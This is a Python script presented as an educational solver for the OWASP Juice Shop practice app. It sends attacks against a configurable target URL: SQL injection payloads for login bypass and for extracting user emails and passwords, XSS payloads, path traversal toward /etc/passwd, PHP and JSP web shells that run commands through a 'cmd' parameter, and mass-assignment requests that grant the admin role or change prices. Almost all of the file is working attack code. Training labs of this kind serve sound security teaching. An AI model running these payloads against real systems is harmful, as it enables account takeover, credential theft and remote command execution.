#!/usr/bin/env python3
"""
OWASP Juice Shop Challenge Solver
Educational tool for learning web security concepts

USAGE:
    python juice_shop_solver.py                    # Run all solvers against localhost:3000
    python juice_shop_solver.py --url http://...   # Use custom Juice Shop URL
    python juice_shop_solver.py --list             # List available challenges
    python juice_shop_solver.py --challenge NAME   # Solve specific challenge

REQUIREMENTS:
    - OWASP Juice Shop running (default: http://localhost:3000)
    - Python 3.6+
    - requests library (auto-installed if missing)

EXAMPLES:
    python juice_shop_solver.py --url http://192.168.1.100:3000
    python juice_shop_solver.py --list
"""

# Auto-install requests if not available
try:
    import requests
except ImportError:
    print("Installing required package: requests")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

import json
import time
import re
from urllib.parse import urljoin
from typing import Dict, List, Optional

class JuiceShopSolver:
    def __init__(self, base_url: str = "http://localhost:3000"):
        """Initialize the Juice Shop solver with base URL"""
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.challenges = {}
        self.solved_challenges = []
        
    def check_connection(self) -> bool:
        """Check if Juice Shop is accessible"""
        try:
            print(f"🔗 Testing connection to: {self.base_url}")
            response = self.session.get(self.base_url, timeout=10)
            print(f"📊 Connection Status Code: {response.status_code}")
            print(f"📏 Response Length: {len(response.text)} bytes")
            
            success = response.status_code == 200
            if success:
                print(f"✅ Connection successful!")
            else:
                print(f"❌ Connection failed!")
                
            return success
        except requests.RequestException as e:
            print(f"❌ Connection exception: {e}")
            return False
    
    def get_challenges(self) -> Dict:
        """Retrieve all available challenges"""
        try:
            url = urljoin(self.base_url, '/api/Challenges/')
            print(f"🔗 Fetching challenges from: {url}")
            response = self.session.get(url)
            print(f"📊 Challenges API Status Code: {response.status_code}")
            print(f"📏 Response Length: {len(response.text)} bytes")
            
            if response.status_code == 200:
                challenges_data = response.json()
                self.challenges = {c['name']: c for c in challenges_data['data']}
                print(f"📋 Successfully loaded {len(self.challenges)} challenges")
                return self.challenges
            else:
                print(f"❌ Failed to fetch challenges")
                if response.text:
                    print(f"📄 Error response: {response.text[:200]}...")
                    
        except requests.RequestException as e:
            print(f"❌ Challenges request exception: {e}")
        return {}
    
    def register_user(self, email: str, password: str) -> bool:
        """Register a new user"""
        url = urljoin(self.base_url, '/api/Users/')
        data = {
            'email': email,
            'password': password,
            'passwordRepeat': password,
            'securityQuestion': {'id': 1, 'question': 'Your eldest siblings middle name?'},
            'securityAnswer': 'test'
        }
        try:
            response = self.session.post(url, json=data)
            return response.status_code == 201
        except requests.RequestException:
            return False
    
    def login(self, email: str, password: str) -> bool:
        """Login with credentials"""
        url = urljoin(self.base_url, '/rest/user/login')
        data = {'email': email, 'password': password}
        try:
            response = self.session.post(url, json=data)
            if response.status_code == 200:
                auth_data = response.json()
                token = auth_data.get('authentication', {}).get('token')
                if token:
                    self.session.headers.update({'Authorization': f'Bearer {token}'})
                    return True
        except requests.RequestException:
            pass
        return False
    
    def solve_dom_xss(self) -> bool:
        """Solve DOM XSS challenge"""
        try:
            # DOM XSS in search functionality
            url = urljoin(self.base_url, '/#/search?q=<iframe src="javascript:alert(`xss`)"></iframe>')
            print(f"   🔗 Requesting: {url}")
            response = self.session.get(url)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Response Length: {len(response.text)} bytes")
            
            success = response.status_code == 200
            if success:
                print(f"   ✅ DOM XSS payload delivered successfully")
            else:
                print(f"   ❌ Request failed")
                
            return success
        except requests.RequestException as e:
            print(f"   ❌ Request exception: {e}")
            return False
    
    def solve_sql_injection_login(self) -> bool:
        """Solve SQL injection login bypass using multiple payloads"""
        url = urljoin(self.base_url, '/rest/user/login')
        
        # Multiple SQL injection payloads
        payloads = [
            {
                'name': 'Classic Comment Bypass',
                'email': "admin@juice-sh.op'--",
                'password': 'anything'
            },
            {
                'name': 'Union-based Bypass',
                'email': "' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--",
                'password': 'anything'
            },
            {
                'name': 'OR 1=1 Bypass',
                'email': "admin@juice-sh.op' OR '1'='1'--",
                'password': 'anything'
            },
            {
                'name': 'Boolean-based Bypass',
                'email': "admin@juice-sh.op' OR 1=1#",
                'password': 'anything'
            }
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                data = {
                    'email': payload['email'],
                    'password': payload['password']
                }
                
                print(f"   🔗 Attempting SQL injection {i}/{len(payloads)}: {payload['name']}")
                print(f"   🔗 Requesting: {url}")
                print(f"   📤 Payload: {json.dumps(data, indent=2)}")
                response = self.session.post(url, json=data)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                success = response.status_code == 200 and 'authentication' in response.text
                if success:
                    print(f"   ✅ SQL Injection successful with {payload['name']}!")
                    # Extract and show token info
                    try:
                        resp_json = response.json()
                        if 'authentication' in resp_json:
                            token = resp_json['authentication'].get('token', 'N/A')[:50] + '...'
                            print(f"   🔑 Token: {token}")
                    except:
                        pass
                    return True
                else:
                    print(f"   ❌ {payload['name']} failed")
                    if response.text:
                        print(f"   📄 Response preview: {response.text[:200]}...")
                        
            except requests.RequestException as e:
                print(f"   ❌ Request exception for {payload['name']}: {e}")
                continue
                
        print(f"   ❌ All SQL injection attempts failed")
        return False
    
    def solve_sql_injection_search(self) -> bool:
        """Solve SQL injection in product search (ModSecurity detectable)"""
        # SQL injection in the search functionality
        payloads = [
            {
                'name': 'UNION SELECT Attack',
                'value': "')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
            },
            {
                'name': 'Boolean-based Blind SQLi',
                'value': "')) AND (SELECT COUNT(*) FROM Users WHERE email LIKE '%admin%') > 0--"
            },
            {
                'name': 'Time-based Blind SQLi',
                'value': "')) AND (SELECT SLEEP(5))--"
            },
            {
                'name': 'Error-based SQLi',
                'value': "')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM NonExistentTable--"
            }
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                url = urljoin(self.base_url, f"/rest/products/search?q={payload['value']}")
                print(f"   🔗 Attempting SQL injection {i}/{len(payloads)}: {payload['name']}")
                print(f"   🔗 Requesting: {url}")
                print(f"   📤 Payload: {payload['value']}")
                
                response = self.session.get(url)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    # Check for SQL injection success indicators
                    sql_indicators = [
                        'admin@juice-sh.op', 'user@juice-sh.op', 'sqlite_error', 
                        'syntax error', 'email', 'password', 'users', 'select'
                    ]
                    
                    if any(indicator in response_text for indicator in sql_indicators):
                        print(f"   ✅ SQL injection successful with {payload['name']}!")
                        print(f"   📄 Response preview: {response.text[:300]}...")
                        return True
                    else:
                        print(f"   ⚠️  Request successful but no SQL injection indicators")
                else:
                    print(f"   ❌ {payload['name']} blocked or failed")
                    if response.text:
                        print(f"   📄 Error response: {response.text[:200]}...")
                        
            except requests.RequestException as e:
                print(f"   ❌ Request exception for {payload['name']}: {e}")
                continue
                
        print(f"   ❌ All SQL injection search attempts failed or blocked")
        return False
    
    def solve_path_traversal(self) -> bool:
        """Solve path traversal challenge"""
        paths = [
            '/ftp/../../../etc/passwd',
            '/ftp/../../../windows/system32/drivers/etc/hosts',
            '/ftp/package.json.bak/../../../package.json'
        ]
        
        for i, path in enumerate(paths, 1):
            try:
                url = urljoin(self.base_url, path)
                print(f"   🔗 Attempting path {i}/{len(paths)}: {url}")
                response = self.session.get(url)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code == 200:
                    print(f"   ✅ Path traversal successful!")
                    print(f"   📄 Response preview: {response.text[:100]}...")
                    return True
                else:
                    print(f"   ❌ Path failed")
                    
            except requests.RequestException as e:
                print(f"   ❌ Request exception: {e}")
                continue
                
        print(f"   ❌ All path traversal attempts failed")
        return False
    
    def solve_xss_in_search(self) -> bool:
        """Solve XSS in search functionality"""
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '"><script>alert(document.domain)</script>'
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                url = urljoin(self.base_url, f'/rest/products/search?q={payload}')
                print(f"   🔗 Attempting XSS {i}/{len(payloads)}: {url}")
                print(f"   📤 Payload: {payload}")
                response = self.session.get(url)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code == 200:
                    print(f"   ✅ XSS payload accepted!")
                    print(f"   📄 Response preview: {response.text[:150]}...")
                    return True
                else:
                    print(f"   ❌ XSS payload rejected")
                    
            except requests.RequestException as e:
                print(f"   ❌ Request exception: {e}")
                continue
                
        print(f"   ❌ All XSS attempts failed")
        return False
    
    def solve_admin_registration(self) -> bool:
        """Solve admin registration challenge"""
        try:
            # Register as admin by manipulating the role field
            url = urljoin(self.base_url, '/api/Users/')
            data = {
                'email': f'admin{int(time.time())}@juice-sh.op',  # Unique email
                'password': 'Admin123!',
                'passwordRepeat': 'Admin123!',
                'role': 'admin',  # This is the key - adding admin role
                'securityQuestion': {
                    'id': 1,
                    'question': 'Your eldest siblings middle name?'
                },
                'securityAnswer': 'test'
            }
            
            print(f"   🔗 Requesting: {url}")
            print(f"   📤 Payload: {json.dumps(data, indent=2)}")
            response = self.session.post(url, json=data)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Response Length: {len(response.text)} bytes")
            
            # Check if registration was successful
            if response.status_code == 201:
                print(f"   ✅ Admin user registered successfully")
                try:
                    resp_json = response.json()
                    user_id = resp_json.get('id', 'N/A')
                    user_email = resp_json.get('email', 'N/A')
                    user_role = resp_json.get('role', 'N/A')
                    print(f"   👤 Created User ID: {user_id}")
                    print(f"   📧 Email: {user_email}")
                    print(f"   🔐 Role: {user_role}")
                except Exception as e:
                    print(f"   📄 Response JSON parse error: {e}")
                    print(f"   📄 Raw response: {response.text[:300]}...")
                return True
            else:
                print(f"   ❌ Registration failed with status: {response.status_code}")
                if response.text:
                    print(f"   📄 Error response: {response.text[:300]}...")
                return False
                
        except requests.RequestException as e:
            print(f"   ❌ Request exception: {e}")
            return False
    
    def solve_file_upload_bypass(self) -> bool:
        """Solve file upload bypass challenge (ModSecurity detectable)"""
        # Malicious file upload attempts
        payloads = [
            {
                'name': 'PHP Webshell Upload',
                'filename': 'shell.php',
                'content': '<?php system($_GET["cmd"]); ?>',
                'content_type': 'application/x-php'
            },
            {
                'name': 'JSP Webshell Upload', 
                'filename': 'shell.jsp',
                'content': '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                'content_type': 'application/x-jsp'
            },
            {
                'name': 'Double Extension Bypass',
                'filename': 'image.jpg.php',
                'content': '<?php echo "File upload bypass"; system($_GET["c"]); ?>',
                'content_type': 'image/jpeg'
            }
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                url = urljoin(self.base_url, '/file-upload')
                
                # Create multipart form data
                files = {
                    'file': (payload['filename'], payload['content'], payload['content_type'])
                }
                
                print(f"   🔗 Attempting file upload {i}/{len(payloads)}: {payload['name']}")
                print(f"   🔗 Requesting: {url}")
                print(f"   📤 File: {payload['filename']} ({payload['content_type']})")
                print(f"   📄 Content preview: {payload['content'][:50]}...")
                
                response = self.session.post(url, files=files)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code in [200, 204]:
                    print(f"   ✅ File upload successful with {payload['name']}!")
                    if response.text:
                        print(f"   📄 Response: {response.text[:200]}...")
                    return True
                else:
                    print(f"   ❌ {payload['name']} blocked or failed")
                    if response.text:
                        print(f"   📄 Error response: {response.text[:200]}...")
                        
            except requests.RequestException as e:
                print(f"   ❌ Request exception for {payload['name']}: {e}")
                continue
                
        print(f"   ❌ All file upload attempts failed or blocked")
        return False
    
    def solve_mass_assignment(self) -> bool:
        """Solve mass assignment vulnerability (ModSecurity detectable)"""
        # Mass assignment through user registration and update
        attacks = [
            {
                'name': 'Admin Role Assignment',
                'endpoint': '/api/Users/',
                'method': 'POST',
                'data': {
                    'email': f'massassign{int(time.time())}@test.com',
                    'password': 'Test123!',
                    'passwordRepeat': 'Test123!',
                    'role': 'admin',
                    'isActive': True,
                    'totpSecret': 'bypass',
                    'securityQuestion': {'id': 1},
                    'securityAnswer': 'test'
                }
            },
            {
                'name': 'Price Manipulation',
                'endpoint': '/api/BasketItems/',
                'method': 'POST', 
                'data': {
                    'ProductId': 1,
                    'BasketId': 1,
                    'quantity': 1,
                    'price': 0.01  # Manipulate price
                }
            },
            {
                'name': 'User ID Manipulation',
                'endpoint': '/api/Users/',
                'method': 'POST',
                'data': {
                    'id': 999,  # Try to set specific ID
                    'email': f'idmanip{int(time.time())}@test.com',
                    'password': 'Test123!',
                    'passwordRepeat': 'Test123!',
                    'securityQuestion': {'id': 1},
                    'securityAnswer': 'test'
                }
            }
        ]
        
        for i, attack in enumerate(attacks, 1):
            try:
                url = urljoin(self.base_url, attack['endpoint'])
                print(f"   🔗 Attempting mass assignment {i}/{len(attacks)}: {attack['name']}")
                print(f"   🔗 Requesting: {url}")
                print(f"   📤 Payload: {json.dumps(attack['data'], indent=2)}")
                
                if attack['method'] == 'POST':
                    response = self.session.post(url, json=attack['data'])
                
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code in [200, 201]:
                    print(f"   ✅ Mass assignment successful with {attack['name']}!")
                    try:
                        resp_json = response.json()
                        if 'role' in resp_json and resp_json['role'] == 'admin':
                            print(f"   🔐 Admin role successfully assigned!")
                        if 'id' in resp_json:
                            print(f"   🆔 User ID: {resp_json['id']}")
                        print(f"   📄 Response preview: {response.text[:200]}...")
                    except:
                        print(f"   📄 Response preview: {response.text[:200]}...")
                    return True
                else:
                    print(f"   ❌ {attack['name']} blocked or failed")
                    if response.text:
                        print(f"   📄 Error response: {response.text[:200]}...")
                        
            except requests.RequestException as e:
                print(f"   ❌ Request exception for {attack['name']}: {e}")
                continue
                
        print(f"   ❌ All mass assignment attempts failed or blocked")
        return False
    
    def get_solved_challenges(self) -> List[str]:
        """Get list of solved challenges"""
        try:
            url = urljoin(self.base_url, '/api/Challenges/')
            response = self.session.get(url)
            if response.status_code == 200:
                challenges = response.json()['data']
                solved = [c['name'] for c in challenges if c.get('solved')]
                self.solved_challenges = solved
                return solved
        except requests.RequestException:
            pass
        return []
    
    def run_all_solvers(self) -> Dict[str, bool]:
        """Run all challenge solvers"""
        results = {}
        
        print("Starting Juice Shop challenge solving...")
        
        if not self.check_connection():
            print(f"❌ Cannot connect to Juice Shop at {self.base_url}")
            return results
        
        print(f"✅ Connected to Juice Shop at {self.base_url}")
        
        # Get available challenges
        challenges = self.get_challenges()
        
        # Define solvers
        solvers = {
            'DOM XSS': self.solve_dom_xss,
            'SQL Injection Login': self.solve_sql_injection_login,
            'SQL Injection Search': self.solve_sql_injection_search,
            'Path Traversal': self.solve_path_traversal,
            'XSS in Search': self.solve_xss_in_search,
            'Admin Registration': self.solve_admin_registration,
            'File Upload Bypass': self.solve_file_upload_bypass,
            'Mass Assignment': self.solve_mass_assignment
        }
        
        # Run each solver
        for name, solver in solvers.items():
            print(f"🔄 Attempting: {name}")
            try:
                success = solver()
                results[name] = success
                status = "✅ Solved" if success else "❌ Failed"
                print(f"   {status}: {name}")
                time.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"   ❌ Error in {name}: {e}")
                results[name] = False
        
        # Check solved challenges
        solved = self.get_solved_challenges()
        print(f"\n🏆 Total challenges solved: {len(solved)}")
        
        return results

def main():
    """Main function to run the solver"""
    import argparse
    
    parser = argparse.ArgumentParser(description='OWASP Juice Shop Challenge Solver')
    parser.add_argument('--url', default='http://localhost:3000', 
                       help='Juice Shop URL (default: http://localhost:3000)')
    parser.add_argument('--challenge', help='Solve specific challenge')
    parser.add_argument('--list', action='store_true', 
                       help='List available challenges')
    
    args = parser.parse_args()
    
    solver = JuiceShopSolver(args.url)
    
    if args.list:
        challenges = solver.get_challenges()
        print("Available challenges:")
        for name, challenge in challenges.items():
            difficulty = challenge.get('difficulty', 'Unknown')
            print(f"  - {name} (Difficulty: {difficulty})")
        return
    
    if args.challenge:
        print(f"Solving specific challenge: {args.challenge}")
        # Add specific challenge solving logic here
        return
    
    # Run all solvers
    results = solver.run_all_solvers()
    
    # Print summary
    print("\n" + "="*50)
    print("SUMMARY")
    print("="*50)
    solved_count = sum(1 for success in results.values() if success)
    total_count = len(results)
    print(f"Solved: {solved_count}/{total_count} challenges")
    
    for challenge, success in results.items():
        status = "✅" if success else "❌"
        print(f"{status} {challenge}")

if __name__ == "__main__":
    main()